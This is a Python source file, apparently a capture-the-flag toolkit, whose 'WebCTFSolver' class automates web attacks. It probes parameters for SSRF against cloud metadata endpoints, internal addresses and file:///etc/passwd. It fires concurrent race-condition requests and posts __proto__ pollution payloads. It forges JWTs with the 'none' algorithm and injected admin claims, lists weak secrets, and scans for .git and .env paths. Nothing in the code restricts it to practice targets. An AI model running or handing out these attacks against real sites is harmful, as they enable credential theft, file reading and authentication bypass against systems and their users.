"""
Web CTF Solver for Advanced Web Exploitation

Provides:
- SSRF chain discovery
- Race condition exploitation
- Prototype pollution scanning
- JWT attack automation
- Advanced web attack techniques
"""

import asyncio
import aiohttp
import time
import json
import re
import logging
import hashlib
from dataclasses import dataclass, field
from typing import Optional, Dict, Any, List, Tuple, Callable, Set
from enum import Enum
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import concurrent.futures

logger = logging.getLogger(__name__)


class SSRFProtocol(Enum):
    """SSRF protocols to test."""
    HTTP = "http"
    HTTPS = "https"
    FILE = "file"
    GOPHER = "gopher"
    DICT = "dict"
    FTP = "ftp"


@dataclass
class SSRFChain:
    """Represents an SSRF exploitation chain."""
    entry_point: str
    parameter: str
    protocols_allowed: List[SSRFProtocol]
    internal_access: bool = False
    cloud_metadata: bool = False
    file_read: bool = False
    chain_steps: List[Dict[str, Any]] = field(default_factory=list)
    evidence: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "entry_point": self.entry_point,
            "parameter": self.parameter,
            "protocols": [p.value for p in self.protocols_allowed],
            "internal_access": self.internal_access,
            "cloud_metadata": self.cloud_metadata,
            "file_read": self.file_read,
            "chain_steps": self.chain_steps,
            "evidence": self.evidence,
        }


@dataclass
class RaceConditionResult:
    """Result of a race condition exploit."""
    success: bool
    requests_sent: int
    successful_responses: int
    response_times: List[float]
    anomalies: List[Dict[str, Any]]
    flag: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "success": self.success,
            "requests_sent": self.requests_sent,
            "successful_responses": self.successful_responses,
            "avg_response_time": sum(self.response_times) / len(self.response_times) if self.response_times else 0,
            "anomalies": self.anomalies,
            "flag": self.flag,
        }


@dataclass
class PrototypePollutionResult:
    """Result of prototype pollution scanning."""
    vulnerable: bool
    endpoint: str
    parameter: str
    payload: str
    evidence: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "vulnerable": self.vulnerable,
            "endpoint": self.endpoint,
            "parameter": self.parameter,
            "payload": self.payload,
            "evidence": self.evidence,
        }


class WebCTFSolver:
    """
    Advanced web exploitation solver for CTF challenges.

    Provides automated techniques for:
    - SSRF discovery and exploitation
    - Race condition attacks
    - Prototype pollution
    - JWT manipulation
    """

    # Common cloud metadata endpoints
    CLOUD_METADATA_URLS = [
        # AWS
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/computeMetadata/v1/",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # Digital Ocean
        "http://169.254.169.254/metadata/v1/",
    ]

    # Internal network ranges to probe
    INTERNAL_RANGES = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
    ]

    # Prototype pollution payloads
    PP_PAYLOADS = [
        {"__proto__": {"polluted": "true"}},
        {"__proto__": {"admin": True}},
        {"constructor": {"prototype": {"polluted": "true"}}},
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"role": "admin"}},
    ]

    def __init__(self,
                 timeout: int = 30,
                 max_concurrent: int = 50,
                 headers: Optional[Dict[str, str]] = None):
        """
        Initialize web solver.

        Args:
            timeout: Request timeout in seconds
            max_concurrent: Maximum concurrent requests
            headers: Default headers for requests
        """
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.headers = headers or {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        self._session: Optional[aiohttp.ClientSession] = None

    async def _get_session(self) -> aiohttp.ClientSession:
        """Get or create aiohttp session."""
        if self._session is None or self._session.closed:
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            self._session = aiohttp.ClientSession(
                timeout=timeout,
                headers=self.headers
            )
        return self._session

    async def close(self) -> None:
        """Close the session."""
        if self._session and not self._session.closed:
            await self._session.close()

    async def discover_ssrf_chains(self,
                                   target: str,
                                   endpoints: List[str],
                                   parameters: Optional[List[str]] = None) -> List[SSRFChain]:
        """
        Discover SSRF vulnerabilities and exploitation chains.

        Args:
            target: Base target URL
            endpoints: List of endpoints to test
            parameters: Specific parameters to test (or auto-discover)

        Returns:
            List of discovered SSRF chains
        """
        chains = []
        session = await self._get_session()

        # Common SSRF parameters
        ssrf_params = parameters or [
            "url", "uri", "path", "src", "source", "href", "file",
            "link", "redirect", "target", "dest", "destination",
            "img", "image", "load", "fetch", "page", "document",
            "feed", "data", "reference", "ref", "callback"
        ]

        for endpoint in endpoints:
            full_url = urljoin(target, endpoint)

            for param in ssrf_params:
                chain = await self._test_ssrf_parameter(session, full_url, param)
                if chain:
                    chains.append(chain)

        return chains

    async def _test_ssrf_parameter(self,
                                   session: aiohttp.ClientSession,
                                   url: str,
                                   param: str) -> Optional[SSRFChain]:
        """Test a specific parameter for SSRF."""
        allowed_protocols = []
        evidence = {}

        # Test basic HTTP callback
        canary = f"http://127.0.0.1:1337/ssrf-test-{int(time.time())}"
        test_url = f"{url}?{param}={canary}"

        try:
            async with session.get(test_url, allow_redirects=False) as resp:
                content = await resp.text()

                # Check if the response indicates SSRF
                if resp.status == 200 or "connection refused" in content.lower():
                    allowed_protocols.append(SSRFProtocol.HTTP)
        except Exception as e:
            logger.debug(f"SSRF test failed for {param}: {e}")
            return None

        if not allowed_protocols:
            return None

        chain = SSRFChain(
            entry_point=url,
            parameter=param,
            protocols_allowed=allowed_protocols
        )

        # Test cloud metadata access
        for metadata_url in self.CLOUD_METADATA_URLS[:3]:  # Test first few
            test_url = f"{url}?{param}={metadata_url}"
            try:
                async with session.get(test_url) as resp:
                    content = await resp.text()
                    if any(indicator in content.lower() for indicator in
                           ["instance-id", "ami-id", "instance-type", "project-id"]):
                        chain.cloud_metadata = True
                        evidence["cloud_metadata"] = content[:500]
                        break
            except Exception:
                continue

        # Test internal network access
        for internal_url in self.INTERNAL_RANGES[:3]:
            test_url = f"{url}?{param}={internal_url}"
            try:
                async with session.get(test_url) as resp:
                    if resp.status == 200:
                        chain.internal_access = True
                        break
            except Exception:
                continue

        # Test file protocol
        file_test_url = f"{url}?{param}=file:///etc/passwd"
        try:
            async with session.get(file_test_url) as resp:
                content = await resp.text()
                if "root:" in content:
                    chain.file_read = True
                    chain.protocols_allowed.append(SSRFProtocol.FILE)
                    evidence["file_read"] = content[:500]
        except Exception:
            pass

        chain.evidence = evidence
        return chain

    async def race_condition_exploit(self,
                                     target: str,
                                     endpoint: str,
                                     payload: Dict[str, Any],
                                     concurrent: int = 100,
                                     method: str = "POST",
                                     success_indicator: Optional[str] = None) -> RaceConditionResult:
        """
        Exploit race condition vulnerabilities.

        Sends multiple concurrent requests to trigger race conditions
        in operations like balance updates, coupon redemption, etc.

        Args:
            target: Base target URL
            endpoint: Endpoint to attack
            payload: Request payload
            concurrent: Number of concurrent requests
            method: HTTP method
            success_indicator: String to identify successful exploitation

        Returns:
            RaceConditionResult with attack results
        """
        url = urljoin(target, endpoint)
        session = await self._get_session()

        response_times = []
        anomalies = []
        responses = []

        async def send_request(req_id: int) -> Tuple[int, float, str, int]:
            """Send a single request and capture response."""
            start_time = time.time()
            try:
                if method.upper() == "POST":
                    async with session.post(url, json=payload) as resp:
                        content = await resp.text()
                        return req_id, time.time() - start_time, content, resp.status
                else:
                    async with session.get(url, params=payload) as resp:
                        content = await resp.text()
                        return req_id, time.time() - start_time, content, resp.status
            except Exception as e:
                return req_id, time.time() - start_time, str(e), 0

        # Create tasks for concurrent execution
        tasks = [send_request(i) for i in range(concurrent)]

        # Execute all requests as simultaneously as possible
        results = await asyncio.gather(*tasks, return_exceptions=True)

        successful = 0
        flag = None

        for result in results:
            if isinstance(result, Exception):
                continue

            req_id, resp_time, content, status = result
            response_times.append(resp_time)

            if status == 200:
                successful += 1
                responses.append(content)

                # Check for success indicator or flag
                if success_indicator and success_indicator in content:
                    anomalies.append({
                        "request_id": req_id,
                        "response_time": resp_time,
                        "indicator_found": True
                    })

                # Try to find CTF flag pattern
                flag_match = re.search(r'(flag\{[^}]+\}|CTF\{[^}]+\}|[A-Z]{3,5}\{[^}]+\})',
                                       content, re.IGNORECASE)
                if flag_match:
                    flag = flag_match.group(1)

        # Analyze for anomalies (duplicate success states, etc.)
        if len(set(responses)) < len(responses) * 0.9:  # >10% duplicates
            anomalies.append({
                "type": "duplicate_responses",
                "unique_count": len(set(responses)),
                "total_count": len(responses)
            })

        return RaceConditionResult(
            success=len(anomalies) > 0 or flag is not None,
            requests_sent=concurrent,
            successful_responses=successful,
            response_times=response_times,
            anomalies=anomalies,
            flag=flag
        )

    async def prototype_pollution_scan(self,
                                       target: str,
                                       endpoints: Optional[List[str]] = None) -> List[PrototypePollutionResult]:
        """
        Scan for prototype pollution vulnerabilities.

        Tests JSON endpoints for __proto__ pollution.

        Args:
            target: Base target URL
            endpoints: Specific endpoints to test

        Returns:
            List of vulnerable endpoints
        """
        results = []
        session = await self._get_session()

        test_endpoints = endpoints or ["/api/user", "/api/settings", "/api/profile"]

        for endpoint in test_endpoints:
            url = urljoin(target, endpoint)

            for payload in self.PP_PAYLOADS:
                try:
                    # Send pollution payload
                    async with session.post(url, json=payload) as resp:
                        content = await resp.text()

                        # Check if pollution was reflected
                        if resp.status == 200:
                            # Verify by checking if pollution persists
                            async with session.get(url) as verify_resp:
                                verify_content = await verify_resp.text()

                                if "polluted" in verify_content or "admin" in verify_content:
                                    results.append(PrototypePollutionResult(
                                        vulnerable=True,
                                        endpoint=endpoint,
                                        parameter="__proto__",
                                        payload=json.dumps(payload),
                                        evidence=verify_content[:500]
                                    ))

                except Exception as e:
                    logger.debug(f"Prototype pollution test failed: {e}")
                    continue

        return results

    async def jwt_attack(self,
                        token: str,
                        target: Optional[str] = None,
                        endpoint: Optional[str] = None) -> Dict[str, Any]:
        """
        Analyze and attack JWT tokens.

        Tests for:
        - Algorithm confusion (none, HS256 -> RS256)
        - Weak secret keys
        - Key injection

        Args:
            token: JWT token to analyze
            target: Target URL for testing forged tokens
            endpoint: Endpoint requiring authentication

        Returns:
            Dictionary with attack results
        """
        import base64

        results = {
            "decoded": {},
            "vulnerabilities": [],
            "forged_tokens": []
        }

        try:
            # Decode token
            parts = token.split(".")
            if len(parts) != 3:
                results["error"] = "Invalid JWT format"
                return results

            # Decode header and payload (without verification)
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))

            results["decoded"] = {
                "header": header,
                "payload": payload
            }

            # Check for weak configurations
            alg = header.get("alg", "").upper()

            if alg == "NONE" or alg == "":
                results["vulnerabilities"].append({
                    "type": "none_algorithm",
                    "severity": "critical"
                })

            # Test 'none' algorithm bypass
            forged_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).decode().rstrip("=")

            # Modify payload if possible (add admin claim)
            modified_payload = payload.copy()
            modified_payload["admin"] = True
            modified_payload["role"] = "admin"

            forged_payload = base64.urlsafe_b64encode(
                json.dumps(modified_payload).encode()
            ).decode().rstrip("=")

            none_token = f"{forged_header}.{forged_payload}."
            results["forged_tokens"].append({
                "type": "none_algorithm",
                "token": none_token
            })

            # Test forged token if target provided
            if target and endpoint:
                session = await self._get_session()
                test_url = urljoin(target, endpoint)

                for forged in results["forged_tokens"]:
                    try:
                        headers = {"Authorization": f"Bearer {forged['token']}"}
                        async with session.get(test_url, headers=headers) as resp:
                            if resp.status == 200:
                                results["vulnerabilities"].append({
                                    "type": f"{forged['type']}_exploitable",
                                    "severity": "critical",
                                    "working_token": forged["token"]
                                })
                    except Exception:
                        continue

            # Common weak secrets to test
            weak_secrets = [
                "secret", "password", "123456", "key",
                "private", "admin", "test", "jwt"
            ]

            results["weak_secret_candidates"] = weak_secrets

        except Exception as e:
            results["error"] = str(e)

        return results

    async def scan_endpoints(self,
                            target: str,
                            wordlist: Optional[List[str]] = None,
                            extensions: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """
        Scan for hidden endpoints.

        Args:
            target: Base target URL
            wordlist: List of paths to check
            extensions: File extensions to append

        Returns:
            List of discovered endpoints
        """
        session = await self._get_session()
        discovered = []

        default_paths = [
            "admin", "api", "backup", "config", "debug",
            "dev", "test", "staging", ".git", ".env",
            "robots.txt", "sitemap.xml", "swagger.json",
            "api-docs", "graphql", "graphiql"
        ]

        paths = wordlist or default_paths
        exts = extensions or ["", ".php", ".asp", ".aspx", ".jsp", ".json", ".xml"]

        semaphore = asyncio.Semaphore(self.max_concurrent)

        async def check_path(path: str) -> Optional[Dict[str, Any]]:
            async with semaphore:
                url = urljoin(target, path)
                try:
                    async with session.get(url, allow_redirects=False) as resp:
                        if resp.status not in [404, 403]:
                            return {
                                "path": path,
                                "url": url,
                                "status": resp.status,
                                "content_length": resp.content_length
                            }
                except Exception:
                    pass
                return None

        # Generate all paths to check
        all_paths = []
        for path in paths:
            for ext in exts:
                all_paths.append(f"{path}{ext}")

        # Check all paths concurrently
        tasks = [check_path(p) for p in all_paths]
        results = await asyncio.gather(*tasks)

        for result in results:
            if result:
                discovered.append(result)

        return discovered


# Synchronous wrapper functions
def discover_ssrf(target: str,
                  endpoints: List[str],
                  parameters: Optional[List[str]] = None) -> List[SSRFChain]:
    """
    Synchronous wrapper for SSRF discovery.

    Args:
        target: Base target URL
        endpoints: Endpoints to test
        parameters: Parameters to test

    Returns:
        List of SSRF chains
    """
    async def run():
        solver = WebCTFSolver()
        try:
            return await solver.discover_ssrf_chains(target, endpoints, parameters)
        finally:
            await solver.close()

    return asyncio.run(run())


def race_condition_attack(target: str,
                         endpoint: str,
                         payload: Dict[str, Any],
                         concurrent: int = 100) -> RaceConditionResult:
    """
    Synchronous wrapper for race condition exploit.

    Args:
        target: Base target URL
        endpoint: Endpoint to attack
        payload: Request payload
        concurrent: Number of concurrent requests

    Returns:
        RaceConditionResult
    """
    async def run():
        solver = WebCTFSolver()
        try:
            return await solver.race_condition_exploit(target, endpoint, payload, concurrent)
        finally:
            await solver.close()

    return asyncio.run(run())


def scan_prototype_pollution(target: str,
                            endpoints: Optional[List[str]] = None) -> List[PrototypePollutionResult]:
    """
    Synchronous wrapper for prototype pollution scan.

    Args:
        target: Base target URL
        endpoints: Endpoints to test

    Returns:
        List of vulnerable endpoints
    """
    async def run():
        solver = WebCTFSolver()
        try:
            return await solver.prototype_pollution_scan(target, endpoints)
        finally:
            await solver.close()

    return asyncio.run(run())
